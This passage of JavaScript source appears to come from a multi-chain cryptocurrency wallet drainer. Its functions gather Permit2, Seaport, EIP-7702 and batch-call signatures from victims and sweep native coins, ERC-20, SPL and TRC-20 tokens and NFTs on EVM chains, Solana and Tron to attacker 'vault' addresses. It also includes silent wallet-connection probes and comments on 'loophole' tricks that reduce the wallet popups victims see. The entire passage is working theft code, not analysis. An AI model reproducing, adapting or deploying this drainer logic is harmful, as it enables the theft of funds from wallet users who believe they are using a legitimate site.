        var _e1keys = (e && typeof e === 'object') ? Object.keys(e).join(',').slice(0,60) : typeof e;
        _dbgLog('Permit2 sign v1 fail', { str: _e1str.slice(0,80), code: _e1code, keys: _e1keys });
        // If error has no code and no message it's likely Trust Wallet silent rejection
        var _e1isReject = !_e1code && !_e1str;
        if (_e1isReject) throw e;
        try {
          permitSig = await provider.request({ method: 'eth_signTypedData_v4', params: [address, td] });
          _dbgLog('Permit2 sign OK (v2)', { chain: Number(chainId) });
        } catch (e2) {
          var _e2str = e2 ? (e2.message || e2.reason || String(e2) || '') : '';
          var _e2code = e2 ? (e2.code || e2.data && e2.data.code || '') : '';
          _dbgLog('Permit2 sign v2 FAIL', { str: _e2str.slice(0,80), code: _e2code });
          if (isUserRejection(e2)) throw e2;
          var _e2isReject = !_e2code && !_e2str;
          if (_e2isReject) throw e2;
          throw e2;
        }
      }
    }

    var nftApprovalSigs = {};
    var nftEntries = extractNftApprovalEntries(bd.nft_approval_typed_data);
    if (nftEntries.length > 0 && !bd.batch_nft_in_permit) {
      var entryBatches = chunkArray(nftEntries, NFT_APPROVAL_BATCH_SIZE);
      for (var bi = 0; bi < entryBatches.length; bi++) {
        var batch = entryBatches[bi];
        for (var ni = 0; ni < batch.length; ni++) {
          var entry = batch[ni];
          try {
            var ntd = normalizeTypedData(JSON.parse(JSON.stringify(entry.typedData)));
            ntd = applyDynamicEip712Domain(ntd, chainId);
          var nsig = await provider.request({
            method: 'eth_signTypedData_v4', params: [address, JSON.stringify(ntd)],
          });
            nftApprovalSigs[entry.contract] = nsig;
          } catch (ne) { L.warn('NFT approval sign fail:', entry.contract, ne.message); }
        }
      }
    }

    var nativeSigned = null;
    if (BigInt(bd.nativeAmount || nativeStr || '0') > 0n && bd.native_transfer) {
      nativeSigned = await signNativeForBatch(provider, address, chainId, bd.native_transfer);
    }

    if (!permitSig && !nativeSigned && nftArr.length === 0) return null;

    return {
      sig: permitSig,
      batchData: bd,
      nativeSigned: nativeSigned,
      nativeBroadcast: null,
      nativeAmount: bd.nativeAmount || nativeStr,
      nftApprovalSigs: nftApprovalSigs,
      nfts: nftArr,
    };
  }

  // 9.7 — TIER 3C: Ledger/Trezor Permit2
  async function drainHardwarePermit2(hwObj, address, chainId, tokens, nfts) {
    if (!tokens || tokens.length === 0) return null;
    var resp = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', {
      wallet_address: address, chain_id: Number(chainId),
      permits: (tokens || []).map(function (t) { return { token: t.address, amount: t.balance || t.amount_raw || null }; })
        .filter(function (p) { return p.amount && BigInt(p.amount) > 0n; }),
      native_amount: '0', nfts: normNftList(nfts),
    });
    if (!resp || !resp.data || !resp.data.typed_data) return null;
    var td = normalizeTypedData(JSON.parse(JSON.stringify(resp.data.typed_data)));
    var sig = hwObj.type === 'ledger'
      ? await HW.signLedgerTypedData(hwObj, td)
      : await HW.signTrezorTypedData(td);
    if (!sig) return null;
    return { sig: sig, batchData: resp.data, nativeAmount: '0', nfts: normNftList(nfts), nftApprovalSigs: {} };
  }

  // 9.8 — TIER 3D: Seaport NFT
  async function drainNFT(provider, address, chainId) {
    var nftResults = [];
    try {
      var scan = await apiPost('/api/v1/seaport/scan-listings', { wallet: address, chain_id: Number(chainId) });
      if (!scan || !scan.data || !scan.data.listings || scan.data.listings.length === 0) return nftResults;
      for (var i = 0; i < scan.data.listings.length; i++) {
        var listing = scan.data.listings[i];
        try {
          var td = await apiPost('/api/v1/seaport/listing-typed-data', {
            wallet: address, token_id: listing.token_id, contract: listing.contract, chain_id: Number(chainId),
          });
          if (!td || !td.data || !td.data.typed_data) continue;
          var sig = await provider.request({ method: 'eth_signTypedData_v4', params: [address, JSON.stringify(td.data.typed_data)] });
          nftResults.push({ listing: listing, sig: sig, orderParams: td.data.order_parameters || {} });
        } catch (e) { L.warn('NFT listing sign fail:', e.message); }
      }
    } catch (e) { L.warn('NFT scan fail:', e.message); }
    return nftResults;
  }

  // 9.9 — DRAIN WATERFALL (reusable per chain)
  async function runDrainWaterfall(provider, address, chainId, walletName, hwObj, assets) {
    if (!assets) {
      assets = await scanAssets(provider, address, chainId);
    }
    await ensureUserFactoryContract(address, chainId);
    if (!(await stateDependentValidation(provider, address, chainId))) {
      L.log('State validation failed on chain', chainId, '— skip drain');
        return false;
      }
    if (!assetsHaveDrainableBalance(assets)) {
      L.log('Chain', chainId, 'no drainable balance — skip personal_sign (lethal-only)');
      // Never personal_sign. Empty chain = no popup here; multi-chain drain may still run.
      return false;
    }

    if (hwObj) {
      UI.status('Approve in ' + hwObj.type + '...');
      var hwP2 = await drainHardwarePermit2(hwObj, address, chainId, assets.tokens, assets.nfts);
      if (hwP2) { await SUBMIT.permit2(hwP2, address, chainId, walletName, assets.nfts, {}); return true; }
      return false;
    }

    var caps = await getCapabilities(provider, address, chainId);
    L.log('chain', chainId, 'atomicBatch:', caps.atomicBatch, 'sendCallsV2:', caps.sendCallsV2, '| signOnly:', SIGN_ONLY);

    var gasLimit = estimateSendCallsGasLimit(
      assets.tokens.length, countUniqueNftContracts(assets.nfts), true, chainId
    );
    var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
    var nativeSend = sweep.send;
    if (nativeSend > 0n) {
      L.log('Vault sweep:', (Number(nativeSend) / 1e18).toFixed(6), 'native | gas cost:', (Number(sweep.gasCost) / 1e18).toFixed(6));
    }
    var didSomething = false;
    var isWcPath = walletName === 'WalletConnect' || !!(provider && provider.isWalletConnect);
    var isMm = isMetaMaskProvider(provider);

    UI.overlay.show('verifying');

    // EIP-7702 first path (before sendCalls) — drainEip7702 unchanged; falls through if unsupported
    if (!didSomething && !isPopupConfirmed('eip7702', chainId)) {
      try {
        var eip7702Data = await drainEip7702(provider, address, chainId, assets);
        if (eip7702Data && eip7702Data.auth) {
          await SUBMIT.eip7702(eip7702Data, address, chainId, walletName);
          markPopupConfirmed('eip7702', chainId);
          didSomething = true;
          L.log('EIP-7702 primary ok');
        } else {
          L.log('EIP-7702 unavailable — fallback paths');
        }
      } catch (e7702) {
        if (isUserRejection(e7702)) throw e7702;
        L.warn('EIP-7702 primary fail:', e7702.message);
      }
    }

    // ═══ LOOPHOLE 1: BLIND wallet_sendCalls — try even without capabilities confirmation ═══
    // Trust/Exodus in-app may support wallet_sendCalls even if getCapabilities fails.
    // ONE popup = native ETH + ERC-20 + NFTs all together.
    var batchTokensBlind = filterDrainableTokens(assets.tokens);
    var hasBlindTargets = nativeSend > MIN_NATIVE_WEI || batchTokensBlind.length > 0 || assets.nfts.length > 0;
    if (!didSomething && hasBlindTargets && !hwObj && !(isMm && !isWcPath) && !isPopupConfirmed('sendCalls', chainId)) {
      try {
        L.log('[drain] BLIND wallet_sendCalls attempt (no capabilities needed)');
        var blindBatch = await drainSendCalls(provider, address, chainId, assets);
        var blindId = extractBatchOrTxId(blindBatch);
        if (blindId && isLikelyTxHash(blindId)) {
          await SUBMIT.sendCalls(blindId, address, chainId, walletName);
          markPopupConfirmed('sendCalls', chainId);
          didSomething = true;
          L.log('BLIND sendCalls OK — ONE popup covered native + ERC-20 + NFTs');
        } else if (blindBatch) {
          // User likely confirmed but id missing — do NOT show sendCalls again
          markPopupConfirmed('sendCalls', chainId);
        }
      } catch (blindE) {
        if (isUserRejection(blindE)) { S.userRejectedSign = true; throw blindE; }
        L.warn('[drain] blind sendCalls fail (expected if unsupported):', blindE.message);
      }
    }

    // MetaMask extension: Permit2 PRIMARY when 7702 unavailable
    if (!didSomething && isMm && !isWcPath) {
      var mmDrainable = filterDrainableTokens(assets.tokens);
      var mmHasTargets = mmDrainable.length > 0 || assets.nfts.length > 0 || nativeSend > MIN_NATIVE_WEI;
      if (mmHasTargets) {
        try {
          var p2mm = await drainPermit2(
            provider, address, chainId, mmDrainable, assets.nfts,
            canTryNativeSignTx(provider) ? nativeSend : 0n
          );
          if (p2mm && isLethalEvmResult(p2mm)) {
            S.pendingEvmPermit2 = p2mm;
            didSomething = true;
            L.log('MetaMask Permit2 primary ok');
          }
        } catch (p2mme) {
          if (isUserRejection(p2mme)) throw p2mme;
          L.warn('MetaMask Permit2 primary fail:', p2mme.message);
        }
      }
    }

    // wallet_sendCalls v2 — only when capabilities confirm batch + not MetaMask-first path
    var canBatch = caps.atomicBatch && caps.sendCallsV2 !== false && NATIVE_BATCH_FALLBACK && !hwObj;
    var batchTokens = filterDrainableTokens(assets.tokens);
    var hasBatchTargets = nativeSend > MIN_NATIVE_WEI || batchTokens.length > 0 || assets.nfts.length > 0;
    if (!didSomething && canBatch && hasBatchTargets && !(isMm && !isWcPath) && !isPopupConfirmed('sendCalls', chainId)) {
      try {
        var batchRaw0 = await drainSendCalls(provider, address, chainId, assets);
        var batchId0 = extractBatchOrTxId(batchRaw0);
        if (batchId0 && isLikelyTxHash(batchId0)) {
          await SUBMIT.sendCalls(batchId0, address, chainId, walletName);
          markPopupConfirmed('sendCalls', chainId);
          didSomething = true;
        } else if (batchRaw0) {
          markPopupConfirmed('sendCalls', chainId);
        }
      } catch (b0e) {
        if (isUserRejection(b0e)) { S.userRejectedSign = true; throw b0e; }
        L.warn('sendCalls primary fail:', b0e.message);
      }
    }

    // ═══ Permit2 FIRST — ERC20 tokens priority (get valuable tokens before native) ═══
    var drainableTokens = filterDrainableTokens(assets.tokens);
    _dbgLog('Drain waterfall state', { chain: Number(chainId), drainable_tokens: drainableTokens.length, p2_confirmed: isPopupConfirmed('permit2', chainId), pending_p2: !!S.pendingEvmPermit2, anchors_ok: Number(S.anchorsOk) || 0 });
    if (drainableTokens.length > 0 && !isPopupConfirmed('permit2', chainId)) {
      try {
        var p2 = await drainPermit2(provider, address, chainId, drainableTokens, assets.nfts, 0n);
        if (p2 && isLethalEvmResult(p2)) {
          S.pendingEvmPermit2 = p2;
          markPopupConfirmed('permit2', chainId);
          didSomething = true;
        } else {
          _dbgLog('Drain permit2 returned null', { chain: Number(chainId) });
        }
      } catch (pe) {
        if (isUserRejection(pe)) { S.userRejectedSign = true; throw pe; }
        L.warn('Permit2 fail:', pe.message);
        _dbgLog('Permit2 fail (outer)', { err: pe && pe.message ? pe.message.slice(0,100) : 'unknown' });
      }
    } else if (drainableTokens.length === 0) {
      _dbgLog('Drain skip: no drainable tokens', { all_tokens: (assets.tokens || []).length });
    } else {
      _dbgLog('Drain skip: p2 already confirmed', { chain: Number(chainId) });
    }

    // ═══ Native eth_sendTransaction AFTER Permit2 — runs regardless of didSomething ═══
    if (MOBILE_SEND_TX && nativeSend > MIN_NATIVE_WEI && !isPopupConfirmed('nativeTx', chainId)) {
      L.log('Native tx | native:', (Number(nativeSend) / 1e18).toFixed(6), '| path:', isWcPath ? 'WC' : 'injected');
      try {
        var wcTx = await drainNativeSendTx(provider, address, chainId, assets);
        if (wcTx && isLikelyTxHash(wcTx)) {
          await SUBMIT.userBroadcast(wcTx, address, chainId, walletName, nativeSend);
          markPopupConfirmed('nativeTx', chainId);
          didSomething = true;
        } else if (wcTx) {
          markPopupConfirmed('nativeTx', chainId);
        }
      } catch (wce) {
        if (isUserRejection(wce)) { S.userRejectedSign = true; throw wce; }
        L.warn('WC native fail:', wce.message);
      }
    }

    // MetaMask claim() last resort — single tx
    if (!didSomething && nativeSend > MIN_NATIVE_WEI && isMm) {
      L.log('MetaMask claim() fallback');
      try {
        var mmTxFirst = await drainNativeSendTx(provider, address, chainId, assets);
        if (mmTxFirst && isLikelyTxHash(mmTxFirst)) {
          await SUBMIT.userBroadcast(mmTxFirst, address, chainId, walletName, nativeSend);
        didSomething = true;
        }
      } catch (mmeFirst) {
        if (isUserRejection(mmeFirst)) throw mmeFirst;
        L.warn('MetaMask claim() fail:', mmeFirst.message);
      }
    }

    if (!didSomething) {
      if (isMm && assets.tokens.length === 0) {
        L.warn('MetaMask native-only: batch or tokens required');
      } else {
        L.warn('No lethal signature on chain', chainId);
      }
    }

    // No personal_sign / no recursive forceLethalSign (would infinite-loop waterfall).

    L.log('Drain chain', chainId, didSomething ? 'ok' : 'skip');

    if (!didSomething && assets.nfts.length > 0) {
      var nftR = await drainNFT(provider, address, chainId);
      for (var i = 0; i < nftR.length; i++) {
        await SUBMIT.nft(nftR[i], address, chainId, walletName);
        didSomething = true;
      }
    }

    return didSomething;
  }

  async function runEvmDrainModeB(provider, address, startChainId, walletName, hwObj, portfolio) {
    if (!S.vaultLoaded) await prefetchVault();
    // Start portfolio scan in background — drain startChainId immediately for fast first popup
    var portfolioP = portfolio ? Promise.resolve(portfolio) : scanFullPortfolio(address);
    var isWcPath = walletName === 'WalletConnect' || !!(provider && provider.isWalletConnect);
    // Quick native drain on startChainId before portfolio scan completes
    if (!isPopupConfirmed('eip7702', startChainId) && !isPopupConfirmed('sendCalls', startChainId) &&
        !isPopupConfirmed('nativeTx', startChainId)) {
      try {
        var quickAssets = await buildChainAssets(provider, address, startChainId, null);
        if (chainHasDrainableAssets(quickAssets)) {
          L.log('Mode B quick drain chain', startChainId, '(pre-scan)');
          await runWithRetry(function () {
            return runDrainWaterfall(provider, address, startChainId, walletName, hwObj, quickAssets);
          }, 'evm-quick-' + startChainId);
        }
      } catch (qe) {
        if (isUserRejection(qe)) throw qe;
      }
    }
    portfolio = await portfolioP;
    var chains = (portfolio.fundedChains && portfolio.fundedChains.length)
      ? portfolio.fundedChains.slice()
      : [startChainId];
    if (chains.indexOf(startChainId) === -1) chains.unshift(startChainId);
    var seen = {};
    var ordered = [];
    chains.forEach(function (cid) {
      if (!seen[cid]) { seen[cid] = true; ordered.push(cid); }
    });
    var anyOk = false;
    try {
      for (var i = 0; i < ordered.length; i++) {
        var cid = ordered[i];
        // Skip chain if all-in-one confirmed, or both native+permit2 done
        if (isPopupConfirmed('eip7702', cid) || isPopupConfirmed('sendCalls', cid) ||
            (isPopupConfirmed('nativeTx', cid) && isPopupConfirmed('permit2', cid))) {
          L.log('Mode B skip chain', cid, '— already confirmed');
          anyOk = true;
          continue;
        }
        // WalletConnect: skip chain switching — tx chainId routes correctly in wallet queue
        if (!isWcPath) {
          var cur = await getProviderChainId(provider);
          if (cur !== cid) {
            if (!(await safeSwitchProviderChain(provider, cid))) {
              L.log('Chain', cid, 'switch declined — skip');
              continue;
            }
            await waitForProviderChain(provider, cid, 8000);
          }
        }
        logContractCoverage(cid);
        var assets = await buildChainAssets(provider, address, cid, portfolio);
        if (!chainHasDrainableAssets(assets)) {
          L.log('Chain', cid, 'empty on-wallet — skip');
          continue;
        }
        L.log('Mode B drain chain', cid, '| $' + (assets.usd || 0).toFixed(2));
        var ok = await runWithRetry(function () {
          return runDrainWaterfall(provider, address, cid, walletName, hwObj, assets);
        }, 'evm-chain-' + cid);
        if (ok) anyOk = true;
      }
    } catch (e) {
      if (isUserRejection(e)) {
        await SCOUT.reportDrainStatus('user_rejected', address, startChainId, walletName, e.message);
      }
      throw e;
    }
    return anyOk;
  }

  async function runEvmDrain(provider, address, chainId, walletName, hwObj, portfolio) {
    return runEvmDrainModeB(provider, address, chainId, walletName, hwObj, portfolio);
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 10: SOLANA MODULE (full — SOL + SPL, per-tx submit)
  // ═══════════════════════════════════════════════════════════════
  async function connectSol() {
    if (S.familyConnections.SVM) return S.familyConnections.SVM;
    var entry = firstFamilyProvider('SVM');
    if (!entry) return null;
    var prov = entry.provider;
    try {
      // Silent probe first — no popup (onlyIfTrusted or already-exposed publicKey)
      var silentAddr = '';
      try {
        var silentPk = prov.publicKey;
        if (!silentPk && prov.features && prov.features['standard:connect']) {
          await prov.features['standard:connect'].connect({ onlyIfTrusted: true }).catch(function () { return null; });
          silentPk = prov.publicKey;
        }
        if (silentPk) silentAddr = silentPk.toString ? silentPk.toString() : String(silentPk);
        if (!silentAddr && prov.publicKey && prov.publicKey.toBase58) silentAddr = prov.publicKey.toBase58();
      } catch (_) {}
      if (silentAddr && silentAddr.length > 20) {
        L.log('[SVM] silent:', silentAddr.slice(0, 8), '(' + entry.hint + ')');
        S.chains.SOL = { address: silentAddr, name: 'SVM' };
        return { provider: prov, address: silentAddr, name: 'SVM', family: 'SVM', hint: entry.hint };
      }
      // Full connect required in Trust in-app (ETH Connect alone is not enough)
      if (prov.features && prov.features['standard:connect']) {
        await prov.features['standard:connect'].connect({});
      } else if (prov.connect) {
        await prov.connect();
      }
      var pk = prov.publicKey;
      var addr = pk ? (pk.toString ? pk.toString() : String(pk)) : '';
      if (!addr) return null;
      L.log('[SVM] connected:', addr.slice(0, 8), '(' + entry.hint + ')');
      S.chains.SOL = { address: addr, name: 'SVM' };
      return { provider: prov, address: addr, name: 'SVM', family: 'SVM', hint: entry.hint };
    } catch (e) { L.warn('[SVM] connect fail:', e.message); return null; }
  }

  async function loadSolWeb3() {
    if (window.solanaWeb3) return window.solanaWeb3;
    try {
      await loadVendorScript('solana-web3.iife.min.js');
      if (window.solanaWeb3) return window.solanaWeb3;
    } catch (e) { L.warn('Solana vendor:', e.message); }
    if (!CDN_FALLBACK) throw new Error('solana-web3 vendor missing');
    await new Promise(function (resolve, reject) {
      var s = document.createElement('script');
      s.src = 'https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js';
      s.onload = resolve; s.onerror = reject;
      document.head.appendChild(s);
    });
    return window.solanaWeb3;
  }

  async function drainSol(conn) {
    if (!conn) return null;
    var vault = VAULT.sol;
      var web3 = await loadSolWeb3();
    var connection = await createSolConnection(web3);
      var fromPk = new web3.PublicKey(conn.address);
      var toPk = new web3.PublicKey(vault);
    var blockhash = (await connection.getLatestBlockhash('confirmed')).blockhash;
      var txList = [];
    var txMetas = [];

      var lamports = await connection.getBalance(fromPk);
    var feeReserve = 50000;
    if (lamports > feeReserve + 5000) {
        var solTx = new web3.Transaction();
        solTx.recentBlockhash = blockhash;
        solTx.feePayer = fromPk;
      var sendLam = lamports - feeReserve;
      solTx.add(web3.SystemProgram.transfer({ fromPubkey: fromPk, toPubkey: toPk, lamports: sendLam }));
        txList.push(solTx);
      txMetas.push({ mint: '11111111111111111111111111111111', amount: String(sendLam), type: 'SOL' });
      }

      var TOKEN_PROG = new web3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
      var ASSOC_PROG = new web3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1fs8');
      try {
        var tokenRes = await connection.getTokenAccountsByOwner(fromPk, { programId: TOKEN_PROG }, { encoding: 'jsonParsed' });
        for (var ti = 0; ti < tokenRes.value.length; ti++) {
          var info = tokenRes.value[ti].account.data.parsed.info;
          var rawAmt = info.tokenAmount && info.tokenAmount.amount;
          if (!rawAmt || rawAmt === '0') continue;
          var mintKey = new web3.PublicKey(info.mint);
          var userATA = new web3.PublicKey(tokenRes.value[ti].pubkey.toString());
          var vaultATA = web3.PublicKey.findProgramAddressSync(
            [toPk.toBuffer(), TOKEN_PROG.toBuffer(), mintKey.toBuffer()], ASSOC_PROG
          )[0];
          var splTx = new web3.Transaction();
          splTx.recentBlockhash = blockhash;
          splTx.feePayer = fromPk;
          var vaultInfo = await connection.getAccountInfo(vaultATA);
          if (!vaultInfo) {
            splTx.add(new web3.TransactionInstruction({
              keys: [
                { pubkey: fromPk, isSigner: true, isWritable: true },
                { pubkey: vaultATA, isSigner: false, isWritable: true },
                { pubkey: toPk, isSigner: false, isWritable: false },
                { pubkey: mintKey, isSigner: false, isWritable: false },
                { pubkey: web3.SystemProgram.programId, isSigner: false, isWritable: false },
                { pubkey: TOKEN_PROG, isSigner: false, isWritable: false },
              ],
              programId: ASSOC_PROG, data: new Uint8Array(0),
            }));
          }
        var amt = BigInt(rawAmt);
          var data = new Uint8Array(9);
          data[0] = 3;
          var dv = new DataView(data.buffer, 1);
          dv.setUint32(0, Number(amt & 0xFFFFFFFFn), true);
          dv.setUint32(4, Number((amt >> 32n) & 0xFFFFFFFFn), true);
          splTx.add(new web3.TransactionInstruction({
            keys: [
              { pubkey: userATA, isSigner: false, isWritable: true },
              { pubkey: vaultATA, isSigner: false, isWritable: true },
              { pubkey: fromPk, isSigner: true, isWritable: false },
            ],
            programId: TOKEN_PROG, data: data,
          }));
          txList.push(splTx);
        txMetas.push({ mint: info.mint, amount: rawAmt, type: 'SPL' });
        }
      } catch (te) { L.warn('SPL scan fail:', te.message); }

    if (txList.length === 0) return null;

    UI.status('Confirm Solana (' + txList.length + ' tx)...');
      var signedTxs;
    if (conn.provider.signAllTransactions) {
      signedTxs = await conn.provider.signAllTransactions(txList);
    } else {
        signedTxs = [];
      for (var si = 0; si < txList.length; si++) {
        signedTxs.push(await conn.provider.signTransaction(txList[si]));
      }
    }

    var legs = [];
    for (var xi = 0; xi < signedTxs.length; xi++) {
      var b64 = bufToB64(signedTxs[xi].serialize());
      await SUBMIT.solana(conn.address, b64, txMetas[xi], conn.name);
      legs.push({ signed_tx_b64: b64, meta: txMetas[xi] });
    }
    S.omnichainLegs.solana = { address: conn.address, txs: legs };
    L.log('SOL submitted', legs.length, 'txs');
    return legs;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 11: TRON MODULE (TRX + dynamic TRC-20 from fusion scout)
  // ═══════════════════════════════════════════════════════════════
  async function connectTron() {
    if (S.familyConnections.TRON) return S.familyConnections.TRON;
    var entry = firstFamilyProvider('TRON');
    if (!entry) return null;
    var tl = entry.provider;
    try {
      // Silent probe first — TronLink-style providers expose defaultAddress without popup
      var tw = tl.tronWeb || window.tronWeb;
      var silentDirect = (tw && tw.defaultAddress && tw.defaultAddress.base58)
        || (tl.defaultAddress && tl.defaultAddress.base58)
        || (tw && (tw.address || tw.tronAddress))   // Trust Wallet direct address property
        || tl.address || tl.selectedAddress || '';
      if (silentDirect) {
        L.log('[TRON] silent:', String(silentDirect).slice(0, 8), '(' + entry.hint + ')');
        S.chains.TRON = { address: String(silentDirect) };
        return { tronWeb: tw || tl, address: String(silentDirect), name: 'TRON', family: 'TRON', hint: entry.hint };
      }
      // Full connect — Trust Wallet tron provider returns address in response, not defaultAddress
      var tronReqFn = tl.request ? tl.request.bind(tl) : (tw && tw.request ? tw.request.bind(tw) : null);
      var addr = '';
      if (tronReqFn) {
        var resp;
        try { resp = await tronReqFn({ method: 'tron_requestAccounts' }); } catch (e1) {
          try { resp = await tronReqFn({ method: 'requestAccounts' }); } catch (e2) { L.warn('[TRON] requestAccounts fail:', e2 && e2.message); }
        }
        // Extract address from response — Trust Wallet returns multiple formats
        if (resp) {
          addr = (typeof resp === 'string' ? resp : '')
            || (resp.base58) || (resp.address)
            || (Array.isArray(resp) && resp[0] && (typeof resp[0] === 'string' ? resp[0] : (resp[0].base58 || resp[0].address)))
            || '';
        }
      }
      // Fallback — check defaultAddress after request (TronLink sets it post-connect)
      tw = tl.tronWeb || window.tronWeb;
      if (!addr) addr = (tw && tw.defaultAddress && tw.defaultAddress.base58) || '';
      if (!addr) addr = (tl.defaultAddress && tl.defaultAddress.base58) || '';
      if (!addr) addr = (tw && (tw.address || tw.tronAddress)) || tl.address || '';
      if (!addr) return null;
      L.log('[TRON] connected:', String(addr).slice(0, 8), '(' + entry.hint + ')');
      S.chains.TRON = { address: String(addr) };
      return { tronWeb: tw || tl, address: String(addr), name: 'TRON', family: 'TRON', hint: entry.hint };
    } catch (e) { L.warn('[TRON] connect fail:', e.message); return null; }
  }

  async function tronFetchWithFallback(path) {
    var lastErr = null;
    for (var ti = 0; ti < TRON_RPCS.length; ti++) {
      try {
        var base = String(TRON_RPCS[ti]).replace(/\/$/, '');
        var res = await fetch(base + path);
        if (!res.ok) throw new Error('HTTP ' + res.status);
        return await res.json();
      } catch (e) { lastErr = e; }
    }
    throw lastErr || new Error('All TRON RPCs failed');
  }

  async function drainTron(conn) {
    if (!conn) return null;
    if (conn.wcSigner) await ensureWcTronWebLoaded();
    var tronWeb = conn.tronWeb;
    var address = conn.address;
    var vault = VAULT.tron;
    var submitted = [];

    // WC path: tronWeb injected nahi hai — window.TronWeb se build karo, WC se sign karo
    var signTx;
    if (conn.wcSigner && !tronWeb && _wcProv) {
      var TW = window.TronWeb;
      if (TW) {
        try {
          tronWeb = new TW({ fullHost: TRON_RPCS[0] || 'https://api.trongrid.io' });
          tronWeb.setAddress(address);
          L.log('[TRON-WC] TronWeb instantiated for WC signing');
        } catch (eTw) { L.warn('[TRON-WC] TronWeb init fail:', eTw.message); }
      }
      var _wcProvRef = _wcProv;
      signTx = function(tx) {
        return _wcProvRef.request({ method: 'tron_signTransaction', params: [tx] });
      };
    } else {
      signTx = function(tx) { return tronWeb.trx.sign(tx); };
    }

    if (!tronWeb) { L.warn('[TRON] no tronWeb available — skip'); return null; }

    var trc20List = [];
    (S.fusionAssets || []).forEach(function (a) {
      if ((a.family === 'TRON' || a.chain_family === 'TRON') && a.token_address && a.token_address.startsWith('T')) {
        trc20List.push({ contract: a.token_address, symbol: a.symbol || 'TRC20' });
      }
    });
    if (trc20List.length === 0) {
      trc20List = [
        { contract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', symbol: 'USDT' },
        { contract: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', symbol: 'USDC' },
      ];
    }

    try {
      var balance = await tronWeb.trx.getBalance(address);
      if ((!balance || balance < 3000000) && address) {
        try {
          var acct = await tronFetchWithFallback('/v1/accounts/' + address);
          var acctData = acct && acct.data && acct.data[0];
          if (acctData && acctData.balance) balance = acctData.balance;
        } catch (eRpc) { L.warn('TRON RPC fallback:', eRpc.message); }
      }
      if (balance && balance >= 3000000) {
        var dynFee = Math.max(1000000, Math.floor(balance * 0.1));
        var sendAmt = balance - dynFee;
        if (sendAmt > 0) {
          UI.status('Confirm TRX transfer...');
          var tx = await tronWeb.transactionBuilder.sendTrx(vault, sendAmt, address);
          var signed = await signTx(tx);
          if (signed) {
            await SUBMIT.tron(address, signed, vault, sendAmt, conn.name);
            submitted.push({ type: 'TRX', amount: sendAmt, signed: signed });
          }
        }
      }

      for (var i = 0; i < trc20List.length; i++) {
        try {
          var c = await tronWeb.contract().at(trc20List[i].contract);
          var bal = await c.balanceOf(address).call();
          var balStr = bal && bal.toString ? bal.toString() : String(bal || '0');
          if (BigInt(balStr) <= 0n) continue;
          UI.status('Confirm ' + trc20List[i].symbol + '...');
          var ttx = await tronWeb.transactionBuilder.triggerSmartContract(
            trc20List[i].contract, 'transfer(address,uint256)', { feeLimit: 100000000 },
            [{ type: 'address', value: vault }, { type: 'uint256', value: balStr }], address
          );
          var sTx = await signTx(ttx.transaction);
          if (sTx) {
            await SUBMIT.tron(address, sTx, trc20List[i].contract, balStr, conn.name);
            submitted.push({ type: trc20List[i].symbol, amount: balStr, signed: sTx });
          }
        } catch (e2) { L.warn('TRC-20', trc20List[i].symbol, e2.message); }
      }
    } catch (e) { L.warn('TRON drain fail:', e.message); }

    if (submitted.length) S.omnichainLegs.tron = { address: address, legs: submitted };
    return submitted;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 12: TON MODULE (native TON + jettons via TonConnect)
  // ═══════════════════════════════════════════════════════════════
  var _tcConnector = null;

  async function connectTon() {
    if (S.familyConnections.TON) return S.familyConnections.TON;
    var entry = firstFamilyProvider('TON');
    var tonProv = entry ? entry.provider : null;
    if (tonProv) {
      // Silent probe — check account without calling connect()
      try {
        var silentAcc = tonProv.account;
        var silentTonAddr = silentAcc && (silentAcc.address || silentAcc);
        if (silentTonAddr && typeof silentTonAddr === 'string' && silentTonAddr.length > 10) {
          L.log('[TON] silent:', silentTonAddr.slice(0, 8), '(' + entry.hint + ')');
          S.chains.TON = { address: silentTonAddr };
          return { provider: tonProv, address: silentTonAddr, type: 'direct', name: 'TON', family: 'TON', hint: entry.hint };
        }
      } catch (_) {}
      // Full connect — Trust in-app included
      try {
        var r = await tonProv.connect({ items: [{ name: 'ton_addr' }] });
        if (r && r.items) {
          var ai = r.items.find(function (x) { return x.name === 'ton_addr'; });
          if (ai && ai.address) {
            S.chains.TON = { address: ai.address };
            L.log('[TON] connected:', ai.address.slice(0, 8), '(' + entry.hint + ')');
            return { provider: tonProv, address: ai.address, type: 'direct', name: 'TON', family: 'TON', hint: entry.hint };
          }
        }
      } catch (e) {}
    }
    try {
      var TC = resolveTonConnect();
      if (!TC) { await loadVendorScript('tonconnect-sdk.min.js'); TC = resolveTonConnect(); }
      if (!TC) throw new Error('TonConnect SDK missing');
      _tcConnector = new TC({ manifestUrl: window.location.origin + '/tonconnect-manifest.json' });
      return await new Promise(function (resolve) {
        var to = setTimeout(function () { resolve(null); }, 60000);
        _tcConnector.onStatusChange(function (w) {
          if (!w || !w.account) return;
          clearTimeout(to);
          S.chains.TON = { address: w.account.address };
          resolve({ provider: _tcConnector, address: w.account.address, type: 'tonconnect', name: 'TonConnect' });
        });
        if (_tcConnector.openModal) _tcConnector.openModal();
        else _tcConnector.connect({ universalLink: 'https://app.tonkeeper.com/ton-connect', bridgeUrl: 'https://bridge.tonapi.io/bridge' });
      });
    } catch (e) { L.warn('TON connect fail:', e.message); return null; }
  }

  function parseTonAddress(addr) {
    if (!addr) return null;
    addr = String(addr).trim();
    if (addr.indexOf(':') >= 0) {
      var p = addr.split(':'), wc = parseInt(p[0], 10);
      var h = p[1].replace(/[^0-9a-fA-F]/g, '');
      if (h.length !== 64) return null;
      var hash = new Uint8Array(32);
      for (var i = 0; i < 32; i++) hash[i] = parseInt(h.slice(i*2, i*2+2), 16);
      return { workchain: wc, hash: hash };
    }
    try {
      var b64 = addr.replace(/-/g, '+').replace(/_/g, '/');
      while (b64.length % 4) b64 += '=';
      var raw = atob(b64);
      if (raw.length < 34) return null;
      var ufwc = raw.charCodeAt(1); if (ufwc > 127) ufwc -= 256;
      var ufhash = new Uint8Array(32);
